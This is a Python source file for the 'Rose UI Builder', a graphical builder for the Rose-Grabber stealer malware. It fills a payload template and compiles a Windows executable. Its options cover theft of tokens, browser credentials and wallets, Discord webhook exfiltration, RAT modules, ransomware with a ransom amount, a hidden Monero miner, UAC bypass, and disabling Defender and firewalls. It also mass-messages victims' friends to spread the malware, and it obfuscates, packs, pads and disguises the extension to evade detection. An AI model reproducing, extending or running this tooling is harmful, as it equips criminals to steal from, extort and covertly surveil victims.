import sys
import platform
import os
if int(platform.python_version_tuple()[0] + platform.python_version_tuple()[1]) > 311:
    input('Python 3.12+ is not supported at this time, downgrade to Python 3.11.')
    os._exit(1)
if sys.executable.endswith('pythonw.exe'):
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
import string
import requests
import tkinter as tk
import ctypes
import random
import logging
import subprocess
import re
import webbrowser
import asyncio
import shutil
from nicegui import ui, app
from tkinter import filedialog
from dhooks import Webhook, Embed
from pathlib import Path
from concurrent.futures import ProcessPoolExecutor
from multiprocessing import Manager, Queue

pool = ProcessPoolExecutor()

logging.basicConfig(
    level=logging.DEBUG,
    filename='roselog.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

__title__ = 'Rose UI Builder'
__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png'
__version__ = '2.3'
__debugm__ = False
__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")

data_builder = {
    "webhook_url": "",
    "build_name": "",
    "startup": False,
    "injection": False,
    "token": False,
    "browser": False,
    "deviceinf": False,
    "ipinf": False,
    "roblox": False,
    "rose_rat": False,
    "rose_rat_url": "",
    "knight_rat": False,
    "knight_bot_token": "",
    "knight_channel_id": "",
    "knight_prefix": "",
    "screenshot": False,
    "ping": False,
    "fake_error": False,
    "silent_crypto_miner": False,
    "wallet_adress": "",
    "file_pumper": False,
    "file_pumper_size": "",
    "uac_bypass": False,
    "disable_defender": False,
    "disable_firewalls": False,
    "antivm": False,
    "webcam": False,
    "obfuscation": False,
    "type_file": "",
    "ransomware_monero_wallet_adress": "",
    "ransomware_email_adress": "",
    "ransomware_discord_webhook_url": "",
    "ransomware": False,
    "extension_spoofer": False,
    "spoofed_extension": "",
    "spread_malware": False,
    "spread_malware_message": "",
    "ransomware_amount_of_money": "",
    "rose_melt_stub": False,
    "games": False,
    "tbsod": False,
    "bsites": False,
    "disableprot": False
}

links = {
    "xpierroz_github": "https://github.com/xpierroz",
    "xpierroz_insta": "https://www.instagram.com/_p.slm/",
    "gumbobr0t_github": "https://github.com/gumbobr0t",
    "suegdu_github": "https://github.com/suenerve",
    "svn_github": "https://github.com/suvan1911",
    "smth_github": "https://github.com/smthpy",
    "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
    "rose_discord": "https://discord.gg/sMawrDqnta"
}

logger.critical(f"Rose UI Builder is using version {str(__version__)}")

def open_link(key):
    webbrowser.open(links[key])

def auto_update():
    if __debugm__:
        return 
    
    _code = (
            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/builder.py"
    )
    
    code = requests.get(_code, timeout=10).text
    pattern = r"__version__ = '([\d\.]+)'"
    resultats = re.search(pattern, code)
    if resultats:
        version = resultats.group(1)
        if version != __version__:
            f = ctypes.windll.user32.MessageBoxW(
                0, 
                f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}",
                "Rose-Grabber",
                4
            )
            if f == 6:
                webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip")
                os._exit(0)

def change_data(key, value):
    logger.info("change_data called with key " + key + " and value " + str(value))
    global data_builder
    data_builder[key] = value
    logger.info("data_builder: " + str(data_builder))
    return

async def _test_webhook():
    result = await test_webhook(data_builder["webhook_url"])
    if result == 0:
        ui.notify("Webhook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        return 
    ui.notify("Webhook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")

def replace_discord_url(url):
    match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
    if match:
        new_url = match.group(0).replace('discordapp.com', 'discord.com')
        new_url = match.group(0).replace('canary.', '')
        new_url = match.group(0).replace('ptb.', '')
        return new_url
    else:
        return url

async def test_webhook(webhook_url):
    try:
        async with Webhook.Async(replace_discord_url(webhook_url)) as hook:
            embed = Embed(
                description='Webhook is Working',
                color=11795068,
                timestamp="now"
            )
            embed.set_author(name="Success", icon_url=__icon__)
            embed.set_footer(text="Rose-Stealer | t.me/rosegrabber", icon_url=__icon__)
            await hook.send(embed=embed, username='Rose-Stealer | t.me/rosegrabber', avatar_url="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png")
        return 0
    except Exception as e:
        logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
        return 1

def gen_random(c:int):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(c))

def _makebuild(q: Queue, data_builder) -> str:
    logger.info("Entered _makebuild")
    logger.info("data_builder: " + str(data_builder))
    if data_builder["webhook_url"] == "":
        ui.notify("Webhook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["build_name"] == "":
        ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["rose_rat"] and data_builder["rose_rat_url"] == "":
        ui.notify("Rose-RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    if data_builder["knight_rat"] and data_builder["knight_bot_token"] == "":
        ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    
    if data_builder["type_file"] == "":
        ui.notify("No build type selected!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
        return
    
    if data_builder["file_pumper_size"] == "":
        data_builder["file_pumper_size"] = None

    if data_builder["rose_rat_url"] == "":
        data_builder["rose_rat_url"] = ".rat"

    ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
        
    path = os.path.join(Path(__file__).resolve().parent, data_builder['build_name'])
    rosef = os.path.join(path, 'rose.py')
    rosefu = os.path.join(path, 'obf-rose.py')
    rosefub = os.path.join(path, 'obf2-rose.py')
    blankobf = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'blankobf.py')
    pycloak = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'pycloak-main')
    rvenv = os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')
    final = 'dist\\Built.exe'
    post = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'comp', 'post.py')
        
    logger.info(path+rosef+rosefu+blankobf)
    def create_dir():
        logger.info("Entered create_dir")
        try:
            logger.info(f"Path in create_dir is {path}")
            os.mkdir(path)
        except Exception as e:
            logger.error(f"Error in create_dir: {e}")

    def get_files():
        try:
            logging.info("Entered get_files")
            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "source", "rose.py"), path)
            logger.info(f'Successfully copied components to {path}')
        except Exception as e:
            logger.error(f"Error in get_files: {e}")

    def edit_config():
        try:
            logger.info("Entered edit_config")
            with open(rosef, "r", encoding="utf-8") as f:
                text = f.read()
                new = text.replace("WEBHOOK_URL", f"{replace_discord_url(data_builder['webhook_url'])}") \
                .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
                .replace("ROSE_DISCORD_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
                .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
                .replace("KNIGHT_DISCORD_RAT_BOT_TOKEN", f"{data_builder['knight_bot_token']}") \
                .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
                .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                .replace("start_up = False", f"start_up = {data_builder['startup']}") \
                .replace("injection = False", f"injection = {data_builder['injection']}") \
                .replace("browser_stealing = False", f"browser_stealing = {data_builder['browser']}") \
                .replace("token_stealing = False", f"token_stealing = {data_builder['token']}") \
                .replace("deviceinf_stealing = False", f"deviceinf_stealing = {data_builder['deviceinf']}") \
                .replace("ipinf_stealing = False", f"ipinf_stealing = {data_builder['ipinf']}") \
                .replace("roblox_stealing = False", f"roblox_stealing = {data_builder['roblox']}") \
                .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                .replace("uac_bypass = False", f"uac_bypass = {data_builder['uac_bypass']}") \
                .replace("xmr_miner = False", f"xmr_miner = {data_builder['silent_crypto_miner']}") \
                .replace("wallet_adressss", f"{data_builder['wallet_adress']}") \
                .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                .replace("antivm = False", f"antivm = {data_builder['antivm']}") \
                .replace("webcam = False", f"webcam = {data_builder['webcam']}") \
                .replace("ransomware = False", f"ransomware = {data_builder['ransomware']}") \
                .replace("RANS0MWARE_EMAIL", f"{data_builder['ransomware_email_adress']}") \
                .replace("RANSOMWARE_MONERO_ADRESS_", f"{data_builder['ransomware_monero_wallet_adress']}") \
                .replace("RANSOMWARE_WEBHOOKURL", f"{data_builder['ransomware_discord_webhook_url']}") \
                .replace("spread_malware = False", f"spread_malware = {data_builder['spread_malware']}") \
                .replace("SPRMALWARE_MSFG", f"{data_builder['spread_malware_message']}") \
                .replace("RANSOMWARE_AMOUNT_0F_MONEY", f"{data_builder['ransomware_amount_of_money']}") \
                .replace("rose_melt_stub = False", f"rose_melt_stub = {data_builder['rose_melt_stub']}") \
                .replace("games = False", f"games = {data_builder['games']}") \
                .replace("ts_bsod = False", f"ts_bsod = {data_builder['tbsod']}") \
                .replace("block_sites = False", f"block_sites = {data_builder['bsites']}") \
                .replace("disable_protectors = False", f"disable_protectors = {data_builder['disableprot']}")
                
            with open(rosef, "w", encoding="utf-8") as f:
                f.write(new)
        except Exception as e:
            logger.error(f"Error in edit_config: {e}")

    def obfuscate():
        logger.info("Entered obfuscate")
        if data_builder["obfuscation"]:
            logger.info("Entering obfuscate")
            try:
                logger.info("Entering obfuscate process")
                obf1 = f'call \"{rvenv}\" && python \"{blankobf}\" -o \"{rosefu}\" \"{rosef}\"'
                logger.info(obf1)
                subprocess.call(obf1, shell=True, stderr=subprocess.STDOUT)
                install = f'call \"{rvenv}\" && cd \"{pycloak}" && pip install .'
                logger.info(install)
                subprocess.call(install, shell=True, stderr=subprocess.STDOUT)
                obf2 = f'call \"{rvenv}\" && pycloak -o \"{rosefub}\" -d \"{rosefu}\"'
                logger.info(obf2)
                subprocess.call(obf2, shell=True, stderr=subprocess.STDOUT)
                os.remove(rosefu)
                logger.info("Finished obfuscate process")
            except Exception as e:
                logger.error(f"Error in obfuscate: {e}")
    
    def pump_file():
        logger.info("Entered pump_file")
        pumping_proc = 0
        if data_builder["file_pumper"]:
            if data_builder["file_pumper_size"] is not None:
                logger.info(f"DEBUGGING File pumper size is set to {data_builder['file_pumper_size']} MB")
                logger.info("Entering file pump process")
                try:
                    b_size = int(data_builder["file_pumper_size"]) * 1048576
                    bufferSize = 256
                    with open(f"{data_builder['build_name']}.exe", 'ab') as f:
                        for i in range(b_size // bufferSize):
                            f.write(bytes([0] * bufferSize))
                            pumping_proc += 1
                    logger.info(f"Pumped successfuly for {pumping_proc} times ({data_builder['file_pumper_size']})")
                    logger.info("Finished file pump process")
                except Exception as e:
                    logger.error(f"Error in pumping file: {e}")
    
    def compile_python():
        logger.info("Entered py compile")
        upx_dir = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'upx-4.1.0-win64')
        himports = [
            'os',
            're',
            'ctypes',
            'pygame',
            'pygame.camera',
            'subprocess',
            'threading',
            'sys',
            'platform',
            'shutil',
            'sqlite3',
            'string',
            'random',
            'browser_cookie3',
            'base64',
            'json',
            'requests',
            'psutil',
            'discord',
            'discord.ext',
            'discord.ext.commands',
            'winreg',
            'win32con',
            'keyboard',
            'pywifi',
            'pathlib',
            'cv2',
            'io',
            'time',
            'pyttsx3',
            'webbrowser',
            'socketio',
            'uuid',
            'socket',
            'pyautogui',
            'wmi',
            'GPUtil',
            'zipfile',
            'getmac',
            'errno',
            'urllib',
            'urllib.error',
            'pynput',
            'pynput.keyboard',
            'cryptography',
            'cryptography.fernet',
            'win32crypt',
            'dhooks',
            'Crypto',
            'Crypto.Cipher',
            'Crypto.Cipher.AES',
            'PIL',
            'PIL.ImageGrab',
            'zlib',
            'mss',
            'datetime',
            'ctypes.windll',
            'ctypes.c_int',
            'ctypes.c_uint',
            'ctypes.c_ulong',
            'ctypes.POINTER',
            'ctypes.byref',
            'json.loads',
            'json.dumps',
            'zipfile.ZipFile',
            'urllib.request',
            'urllib.request.Request',
            'urllib.request.urlopen',
            'base64.b64decode',
            'socketio',
            'time',
            'zlib.compress',
            'mss.mss',
            'lzma',
            'aiohttp',
        ]
        himports = [item for item in himports if item]
        
        imports = " ".join(["--hidden-import=" + module for module in himports])
        compile_line = f'call \"{rvenv}\" && pyinstaller \"{rosefub if data_builder["obfuscation"] else rosef}\" --clean --name=\"Built\" --upx-dir=\"{upx_dir}\" --noconsole --onefile {imports}'
        try:
            logger.info("Entering python compile process")
            logger.info(f'Python Compile CMD Line: {compile_line}')
            output_file = "rosecompile.log"
            subprocess.call(
                compile_line,
                shell=True,
                stdout=open(output_file, 'w'),
                stderr=subprocess.STDOUT
            )
            logger.info(f"Output of Python compile process saved in rosecompile.log")
            subprocess.call(f'call \"{rvenv}\" && python \"{post}\" dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            logger.error(f"Error in py compile: {e}")

    def cleanup():
        logger.info("Entered cleanup")

        try:
            shutil.move(final, os.path.join(os.getcwd(), f"{data_builder['build_name']}.exe"))
            shutil.rmtree(os.path.join(os.getcwd(), 'build'))
            shutil.rmtree(os.path.join(os.getcwd(), 'dist'))
            shutil.rmtree(os.path.join(os.getcwd(), "resources", "ui", data_builder['build_name']))
            os.remove(os.path.join(os.getcwd(), "Built.spec"))
        except Exception as e:
            logger.error(f"Error in cleanup: {e}")

    def assign_extension():
        logger.info('Entered assign_extension')

        old_exe_path = os.path.join(os.getcwd(), data_builder["build_name"]+'.exe')
        new_scr_path = os.path.join(os.getcwd(), data_builder["build_name"]+'.scr')
        if data_builder["type_file"] == 'Screensaver (.scr)':
            os.rename(old_exe_path, new_scr_path)

    def upx():
        logger.info('Entered upx')
        try:
            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'upx-4.1.0-win64', "upx.exe"), os.getcwd())
            subprocess.run(f'upx -9kqvf {data_builder["build_name"]}.exe', shell=True)
            os.remove(os.path.join(os.getcwd(), "upx.exe"))
        except Exception as e:
            logger.error(f"Error in upx: {e}")
        logger.info('Finished upx')

    def extension_spoofer():
        logger.info('Entered extension_spoofer')
        spoofer = '\u202e'
        extension = data_builder["spoofed_extension"]
        executable_to_spoof = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'

        if data_builder["extension_spoofer"]:
            try:
                extension_added = executable_to_spoof[:len(executable_to_spoof) - 4] + extension[::-1] + executable_to_spoof[-4:]

                global spoofed
                spoofed = extension_added[:len(extension_added) - 7] + spoofer + extension_added[-7:]

                with open(spoofed, "wb") as spoofed_executable:
                    with open(executable_to_spoof, "rb") as source_executable:
                        spoofed_executable.write(source_executable.read())

            except Exception as e:
                logger.error(f"Error in extension_spoofer: {e}")

        logger.info('Finished extension_spoofer')

    create_dir()
    q.put_nowait(0.1)
    get_files()
    q.put_nowait(0.2)
    edit_config()
    q.put_nowait(0.3)
    obfuscate()
    q.put_nowait(0.4)
    compile_python()
    q.put_nowait(0.5)
    cleanup()
    q.put_nowait(0.6)
    upx()
    q.put_nowait(0.7)
    pump_file()
    q.put_nowait(0.8)
    assign_extension()
    q.put_nowait(0.9)
    extension_spoofer()
    q.put_nowait(1)
    return 'Done!'

def _home():
    with ui.dialog() as dialog, ui.card():
        ui.label(f'If the compilation process completed successfully, you should find the executable file within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.')
        ui.button('Open Folder', on_click=lambda: os.startfile(os.getcwd()))
        ui.button('Join Discord', on_click=lambda: webbrowser.open(links["rose_discord"]))
        ui.button('Close', on_click=dialog.close)

    async def start_computation():
        progressbar.visible = True
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(pool, _makebuild, queue, data_builder)
        logger.info(result)
        dialog.open()
        progressbar.visible = False
        
    queue = Manager().Queue()
    ui.timer(0.1, callback=lambda: progressbar.set_value(queue.get() if not queue.empty() else progressbar.value))

    with ui.card():
        with ui.row():
            ui.input(
                label='Webhook URL',
                placeholder='Rose on top baby',
                on_change=lambda e: change_data("webhook_url", e.value)
            ).props('inline color=pink-3').classes('w-full')
            ui.input(
                label='Build name',
                placeholder='Rose on top baby',
                on_change=lambda e: change_data("build_name", e.value)
            ).props('inline color=pink-3').classes('w-full')
            ui.select(
                label='File type',
                options=["Executable (.exe)", "Screensaver (.scr)"],
                on_change=lambda e: change_data('type_file', e.value)
            ).props("color=pink-3").classes('w-full')
            ui.checkbox('Obfuscation', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')
            with ui.row():
                _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=pink-3')
                ui.input(label='Pump Size', placeholder='Size in MB',
                    on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
            with ui.row():
                _spoofer = ui.checkbox('Extension Spoofer', on_change=lambda e: change_data('extension_spoofer', e.value)).props('inline color=pink-3')
                ui.input(label='Spoofed Extension', placeholder='xlsx, png etc.',
                    on_change=lambda e: change_data('spoofed_extension', e.value)).bind_visibility_from(_spoofer, 'value').props('inline color=pink-3')
        
            ui.button(
                'Test Webhook',
                on_click=_test_webhook
            ).props("icon=code color=purple-11").classes('w-full')
            ui.button(
                'Build',
                on_click=start_computation
            ).props("icon=build color=pink-3").classes('w-full')

            progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
            progressbar.visible = False
            
def _features():
    with ui.card():
        with ui.row():
            ui.button('Knight RAT Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md"))
            ui.button('Features Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/FEATURES.md"))
            ui.button('Changelog Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/CHANGELOG.md"))
        
        with ui.expansion('System', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():
                    ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=pink')
                    with ui.row():
                        _inj = ui.checkbox(
                            'Injection',
                            on_change=lambda e: change_data('injection', e.value)
                        ).props('inline color=pink')
                
                with ui.column():
                    ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=pink')
                    ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=pink')

        with ui.expansion('Stealer', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():
                    with ui.row():
                        _token = ui.checkbox('Token', on_change=lambda e: change_data('token', e.value)).props('inline color=green')
                        _spread = ui.checkbox('Mass DM friends', on_change=lambda e: change_data('spread_malware', e.value)).bind_visibility_from(_token, 'value').props('inline color=green')
                        ui.input(label='Message', placeholder='Rose on top baby', on_change=lambda e: change_data('spread_malware_message', e.value)).bind_visibility_from(_spread, 'value').props('inline color=green')

                    ui.checkbox('Browser Credentials', on_change=lambda e: change_data('browser', e.value)).props('inline color=green')
                    ui.checkbox('Games and Wallets', on_change=lambda e: change_data('games', e.value)).props('inline color=green')
                    ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
                    ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
                    
                with ui.column():
                    ui.checkbox('System Information', on_change=lambda e: change_data('deviceinf', e.value)).props('inline color=green')
                    ui.checkbox('IP & Wi-Fi Data', on_change=lambda e: change_data('ipinf', e.value)).props('inline color=green')
                    ui.checkbox('Roblox', on_change=lambda e: change_data('roblox', e.value)).props('inline color=green')
                    ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=green')

        with ui.expansion('Advanced', icon='work').classes('w-full'):
            with ui.row():
                with ui.column():

                    with ui.row():
                        _miner = ui.checkbox('XMR Miner', on_change=lambda e: change_data('silent_crypto_miner', e.value)).props('inline color=yellow-7')
                        ui.input(label='XMR Wallet Address', placeholder='Wallet Address',
                            on_change=lambda e: change_data('wallet_adress', e.value)).bind_visibility_from(_miner, 'value').props('inline color=yellow-7')
                    with ui.row():
                        _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
                        ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
                            on_change=lambda e: change_data('rose_rat_url', e.value)).bind_visibility_from(_rose_rat, 'value').props('inline color=yellow-7')
                    with ui.row():
                        _knight_rat = ui.checkbox('Knight-RAT', on_change=lambda e: change_data('knight_rat', e.value)).props('inline color=yellow-7')
                        ui.input(label='Knight-RAT Bot Token', placeholder='Knight on top baby',
                            on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                        ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
                            on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                        ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
                            on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                
                    with ui.row():
                        _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=yellow-7')
                        ui.input(label='XMR Wallet adress', placeholder='Rose On Top baby!!!',
                            on_change=lambda e: change_data('ransomware_monero_wallet_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                        ui.input(label='Webhook URL', placeholder='Rose On Top baby!!!',
                            on_change=lambda e: change_data('ransomware_discord_webhook_url', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                        ui.input(label='Email adress', placeholder='Email adress here',
                            on_change=lambda e: change_data('ransomware_email_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                        ui.input(label='Amount of money', placeholder='Amount of money the victim has to pay. (in USD)',
                            on_change=lambda e: change_data('ransomware_amount_of_money', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                
                with ui.column():
                    ui.checkbox('Self-Deletion', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=yellow-7')
                    ui.checkbox('Trigger BSOD', on_change=lambda e: change_data('tbsod', e.value)).props(
                    'inline color=yellow-7')

                    with ui.row():
                        _uac = ui.checkbox('UAC Bypass', on_change=lambda e: change_data('uac_bypass', e.value)).props(
                        'inline color=yellow-7')
                        ui.checkbox('Disable Protectors',
                                    on_change=lambda e: change_data('disableprot', e.value)).bind_visibility_from(_uac,
                                                                                                                        'value').props(
                                'inline color=yellow-7')
                        ui.checkbox('Block Sites', on_change=lambda e: change_data('bsites', e.value)).bind_visibility_from(
                            _uac, 'value').props(
                                'inline color=yellow-7')

def _github():
    with ui.card():
        with ui.row():
            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))

        with ui.column():
            ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
            with ui.row():
                with ui.card_section():
                    ui.label("xpierroz").classes("text-h6")
                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                    with ui.row():
                        #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                        ui.button(on_click=lambda: open_link("xpierroz_github")).props("round icon=code color=blue-11")
                        ui.button(on_click=lambda: open_link("xpierroz_insta")).props("round icon=star_rate color=amber-8")

                with ui.card_section():
                    ui.label("gumbobr0t").classes("text-h6")
                    ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("gumbobr0t_github")).props("round icon=code color=blue-11")

            with ui.row():
                with ui.card_section():
                    ui.label("suegdu").classes("text-h6")
                    ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("suegdu_github")).props("round icon=code color=blue-11")

                with ui.card_section():
                    ui.label("svn").classes("text-h6")
                    ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("svn_github")).props("round icon=code color=blue-11")

                with ui.card_section():
                    ui.label("smth.py").classes("text-h6")
                    ui.markdown('<em>- Nothing.</em>').classes("text-subtitle5")
                    ui.button(on_click=lambda: open_link("smth_github")).props("round icon=code color=blue-11")

    with ui.card():
        with ui.card_section():
            with ui.row():
                ui.label(f"Rose {__version__}").classes("text-h6")
                ui.button(on_click=lambda: open_link("rose_github")).props("round icon=code color=blue-11")
                ui.button(on_click=lambda: open_link("rose_discord")).props("round icon=unsubscribe color=indigo-12")

ui.colors(primary='#333')

@ui.page('/home')
def superhome():
    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png').style(
        'position: center; width: 90px; left: 220px;'
    )

    global tabs
    with ui.tabs().classes('w-full') as tabs:
        ui.tab('Home', icon='home')
        ui.tab('Features', icon='fingerprint')
        ui.tab('Settings', icon='face')

    with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('center'):
        with ui.tab_panel('Home').classes('bg-transparent').classes('center'):
            _home()
        with ui.tab_panel('Features'):
            _features()
        with ui.tab_panel('Settings'):
            _github()

v = ui.video('https://github.com/DamagingRose/Rose-Grabber/raw/main/resources/assets/roseloadingscreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
v.on('ended', lambda _: ui.open('/home'))
app.on_shutdown(pool.shutdown)

def start_nicegui(**kwargs):
    ui.run(
        title=__title__,
        **kwargs
    )

if __name__ in {"__main__", "__mp_main__"}:
    auto_update()
    ui.run(
        native=True,
        dark=True,
        reload=False,
        show=False,
        port=2009,
        window_size=(600, 660),
        title=__title__
    )
